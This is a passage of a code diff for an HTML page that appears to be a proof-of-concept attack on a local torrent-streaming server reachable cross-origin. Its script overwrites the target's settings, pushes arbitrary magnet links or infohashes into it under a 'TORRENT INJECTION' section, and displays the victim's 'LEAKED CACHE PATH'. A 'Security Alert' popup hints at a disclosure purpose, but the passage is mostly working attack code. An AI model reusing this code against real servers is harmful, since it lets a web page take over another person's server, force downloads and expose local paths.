+                { id: 'btMaxConnections', val: v.btMaxConnections || 55 },
+                { id: 'btDownloadSpeedSoftLimit', val: v.btDownloadSpeedSoftLimit || 0 },
+                { id: 'btDownloadSpeedHardLimit', val: v.btDownloadSpeedHardLimit || 0 },
+                { id: 'transcodeMaxBitRate', val: v.transcodeMaxBitRate || 0 },
+                { id: 'transcodeConcurrency', val: v.transcodeConcurrency || 1 },
+            ];
+
+            numbers.forEach(num => {
+                html += '<div class="ctrl-row">' +
+                    '<span class="ctrl-label">' + t('lbl_' + num.id) + '<small>' + t('lbl_' + num.id + '_desc') + '</small></span>' +
+                    '<input type="number" class="ctrl-number" data-key="' + num.id + '" data-type="number" value="' + num.val + '">' +
+                    '</div>';
+            });
+
+            document.getElementById('controlCard').innerHTML = html;
+        }
+
+        function collectSettings() {
+            const payload = {};
+            document.querySelectorAll('#controlCard [data-key]').forEach(el => {
+                const key = el.dataset.key;
+                const type = el.dataset.type;
+                if (type === 'bool') {
+                    payload[key] = el.checked;
+                } else if (type === 'number') {
+                    payload[key] = parseInt(el.value, 10) || 0;
+                } else if (type === 'select-null') {
+                    const val = el.value;
+                    payload[key] = val === 'null' ? null : parseInt(val, 10);
+                } else if (type === 'select-str') {
+                    payload[key] = el.value;
+                }
+            });
+            return payload;
+        }
+
+        async function applySettings() {
+            const btn = document.getElementById('applyBtn');
+            btn.disabled = true;
+            btn.textContent = t('applying');
+
+            try {
+                const payload = collectSettings();
+                const res = await fetch(TARGET + '/settings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    mode: 'cors'
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(t('applySuccess'), 'success');
+                    // Refresh settings
+                    const refreshRes = await fetch(TARGET + '/settings', { mode: 'cors' });
+                    cachedSettings = await refreshRes.json();
+                    renderData(cachedSettings, cachedNetwork);
+                    renderControlPanel(cachedSettings);
+                } else {
+                    showToast(t('applyError'), 'error');
+                }
+            } catch (e) {
+                showToast(t('applyError') + ' — ' + e.message, 'error');
+            }
+
+            btn.disabled = false;
+            btn.textContent = t('applyBtn');
+        }
+
+        function showToast(msg, type) {
+            let toast = document.getElementById('toast');
+            if (!toast) {
+                toast = document.createElement('div');
+                toast.id = 'toast';
+                toast.className = 'toast';
+                document.body.appendChild(toast);
+            }
+            toast.textContent = msg;
+            toast.className = 'toast ' + type;
+            requestAnimationFrame(() => {
+                toast.classList.add('show');
+            });
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        function showExplainer() {
+            var dir = lang === 'ar' ? 'rtl' : 'ltr';
+            var align = lang === 'ar' ? 'right' : 'left';
+            var font = lang === 'ar' ? 'Tajawal' : 'Inter';
+            var pad = lang === 'ar' ? 'padding-right' : 'padding-left';
+            Swal.fire({
+                title: t('swalTitle'),
+                html: '<div style="text-align:' + align + ';direction:' + dir + ';font-family:\'' + font + '\',sans-serif;font-size:12.5px;line-height:1.8;color:#999">' + t('swalHtml') + '</div>',
+                imageUrl: 'https://i.pinimg.com/1200x/df/f0/9e/dff09eb56cb7cdda0612a68fc0d401ed.jpg',
+                imageWidth: 340,
+                imageAlt: 'Security Alert',
+                background: '#111111',
+                color: '#ccc',
+                confirmButtonText: t('swalConfirm'),
+                confirmButtonColor: '#7c5cfc',
+                width: 460,
+                customClass: { popup: 'swal-rtl' }
+            });
+        }
+
+        // ===== TORRENT INJECTION =====
+        var torrentPollTimer = null;
+
+        function parseMagnetOrHash(input) {
+            input = input.trim();
+            // Raw infoHash (40 hex chars)
+            if (/^[a-fA-F0-9]{40}$/.test(input)) {
+                return { infoHash: input.toLowerCase(), trackers: [] };
+            }
+            // Magnet link
+            if (input.startsWith('magnet:')) {
+                const hashMatch = input.match(/btih:([a-fA-F0-9]{40})/i);
+                if (!hashMatch) return null;
+                const trackers = [];
+                const trMatches = input.matchAll(/[&?]tr=([^&]+)/gi);
+                for (const m of trMatches) {
+                    trackers.push(decodeURIComponent(m[1]));
+                }
+                return { infoHash: hashMatch[1].toLowerCase(), trackers };
+            }
+            return null;
+        }
+
+        async function injectTorrent() {
+            const input = document.getElementById('torrentInput').value;
+            const btn = document.getElementById('torrentGoBtn');
+            const errEl = document.getElementById('torrentError');
+            const statsEl = document.getElementById('torrentStats');
+
+            errEl.style.display = 'none';
+            statsEl.classList.remove('show');
+            if (torrentPollTimer) clearInterval(torrentPollTimer);
+
+            const parsed = parseMagnetOrHash(input);
+            if (!parsed) {
+                errEl.textContent = t('torrentInvalid');
+                errEl.style.display = 'block';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.textContent = t('torrentCreating');
+
+            const sources = ['dht:' + parsed.infoHash, ...parsed.trackers];
+
+            // Fire create — don't await, start polling immediately
+            fetch(TARGET + '/' + parsed.infoHash + '/create', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    stream: { infoHash: parsed.infoHash },
+                    peerSearch: { min: 40, max: 200, sources: sources }
+                })
+            }).then(r => r.json()).then(() => {
+                showToast(t('torrentCreated'), 'success');
+            }).catch(e => {
+                errEl.textContent = t('torrentFail') + ' — ' + e.message;
+                errEl.style.display = 'block';
+            });
+
+            // Start polling stats immediately (while create is still running)
+            setTimeout(() => {
+                pollTorrentStats(parsed.infoHash);
+                torrentPollTimer = setInterval(() => pollTorrentStats(parsed.infoHash), 2000);
+            }, 500);
+
+            btn.disabled = false;
+            btn.textContent = t('torrentBtn');
+        }
+
+        async function pollTorrentStats(infoHash) {
+            const statsEl = document.getElementById('torrentStats');
+            const errEl = document.getElementById('torrentError');
+            try {
+                const res = await fetch(TARGET + '/' + infoHash + '/0/stats.json');
+                const s = await res.json();
+
+                const progress = Math.round((s.streamProgress || 0) * 100);
+                const dlSpeed = formatSpeed(s.downloadSpeed || 0);
+                const ulSpeed = formatSpeed(s.uploadSpeed || 0);
+                const downloaded = formatBytes(s.downloaded || 0);
+                const uploaded = formatBytes(s.uploaded || 0);
+                const size = formatBytes(s.streamLen || 0);
+                const cachePath = (s.opts && s.opts.path) ? s.opts.path : '—';
+                const peerSearching = s.peerSearchRunning ? '🔍 Active' : '⏹ Stopped';
+                const swarmStatus = s.swarmPaused ? '⏸ Paused' : '▶ Active';
+
+                // Sources list
+                let sourcesHtml = '';
+                if (s.sources && s.sources.length) {
+                    sourcesHtml = '<div style="margin-top:10px">' +
+                        '<div class="ts-lbl" style="margin-bottom:6px;text-align:right">SOURCES / TRACKERS</div>';
+                    s.sources.forEach(src => {
+                        const found = src.numFoundUniq || src.numFound || 0;
+                        const dot = found > 0 ? '🟢' : '🔴';
+                        sourcesHtml += '<div style="display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid #1a1a28;direction:ltr;text-align:left;font-size:11px">' +
+                            '<span style="color:#888;word-break:break-all;flex:1">' + dot + ' ' + esc(src.url) + '</span>' +
+                            '<span style="color:#fff;font-weight:700;margin-left:8px;white-space:nowrap">' + found + ' peers</span>' +
+                            '</div>';
+                    });
+                    sourcesHtml += '</div>';
+                }
+
+                // Files list
+                let filesHtml = '';
+                if (s.files && s.files.length) {
+                    filesHtml = '<div style="margin-top:10px">' +
+                        '<div class="ts-lbl" style="margin-bottom:6px;text-align:right">FILES</div>';
+                    s.files.forEach(f => {
+                        filesHtml += '<div style="direction:ltr;text-align:left;font-size:11px;padding:3px 0;color:#aaa">' +
+                            '📄 ' + esc(f.name) + ' <span style="color:#555">(' + formatBytes(f.length) + ')</span>' +
+                            '</div>';
+                    });
+                    filesHtml += '</div>';
+                }
+
+                statsEl.innerHTML =
+                    // Header
+                    '<div class="ts-header">' +
+                    '<div class="ts-dot"></div>' +
+                    '<div class="ts-title">' + esc(s.streamName || s.name || infoHash) + '</div>' +
+                    '</div>' +
+                    // InfoHash
+                    '<div style="direction:ltr;text-align:left;font-size:10px;color:#555;margin-bottom:10px;word-break:break-all">' +
+                    '🔗 ' + esc(s.infoHash || infoHash) +
+                    '</div>' +
+                    // Main stats grid
+                    '<div class="ts-grid">' +
+                    '<div class="ts-item"><div class="ts-val">' + progress + '%</div><div class="ts-lbl">' + t('tsProgress') + '</div></div>' +
+                    '<div class="ts-item"><div class="ts-val">' + dlSpeed + '</div><div class="ts-lbl">' + t('tsSpeed') + ' ↓</div></div>' +
+                    '<div class="ts-item"><div class="ts-val">' + ulSpeed + '</div><div class="ts-lbl">' + t('tsSpeed') + ' ↑</div></div>' +
+                    '<div class="ts-item"><div class="ts-val">' + (s.peers || 0) + '</div><div class="ts-lbl">' + t('tsPeers') + '</div></div>' +
+                    '<div class="ts-item"><div class="ts-val">' + downloaded + '</div><div class="ts-lbl">Downloaded</div></div>' +
+                    '<div class="ts-item"><div class="ts-val">' + uploaded + '</div><div class="ts-lbl">Uploaded</div></div>' +
+                    '</div>' +
+                    // Progress bar
+                    '<div class="ts-progress"><div class="ts-progress-bar" style="width:' + progress + '%"></div></div>' +
+                    // Detail rows
+                    '<div style="margin-top:12px;display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:11px">' +
+                    '<div style="color:#555">Swarm</div><div style="color:#aaa;direction:ltr;text-align:left">' + swarmStatus + ' • ' + (s.swarmConnections || 0) + '/' + (s.swarmSize || 0) + '</div>' +
+                    '<div style="color:#555">Peer Search</div><div style="color:#aaa;direction:ltr;text-align:left">' + peerSearching + '</div>' +
+                    '<div style="color:#555">Connections</div><div style="color:#aaa;direction:ltr;text-align:left">' + (s.connectionTries || 0) + ' tries • ' + (s.unique || 0) + ' unique</div>' +
+                    '<div style="color:#555">Unchoked</div><div style="color:#aaa;direction:ltr;text-align:left">' + (s.unchoked || 0) + ' • queued: ' + (s.queued || 0) + '</div>' +
+                    '</div>' +
+                    // Cache path (leaked!)
+                    '<div style="margin-top:10px;padding:8px 10px;background:#14141c;border-radius:8px;border:1px solid #e8364f22">' +
+                    '<div class="ts-lbl" style="margin-bottom:4px;color:var(--red)">💀 LEAKED CACHE PATH</div>' +
+                    '<div style="direction:ltr;text-align:left;font-size:11px;color:#e8364f;word-break:break-all">' + esc(cachePath) + '</div>' +
+                    '</div>' +
+                    // Sources
+                    sourcesHtml +
+                    // Files
+                    filesHtml;
+
+                statsEl.classList.add('show');
+                errEl.style.display = 'none';
+
+                if (progress >= 100 && torrentPollTimer) {
+                    clearInterval(torrentPollTimer);
+                }
+            } catch (e) {
+                // Stats not ready yet, keep polling
+            }
+        }
+
+        function formatSpeed(bps) {
+            if (bps >= 1e6) return (bps / 1e6).toFixed(1) + ' MB/s';
+            if (bps >= 1e3) return (bps / 1e3).toFixed(0) + ' KB/s';
+            return bps + ' B/s';
+        }
+
+        init();
+    </script>
+
+</body>
+
+</html>
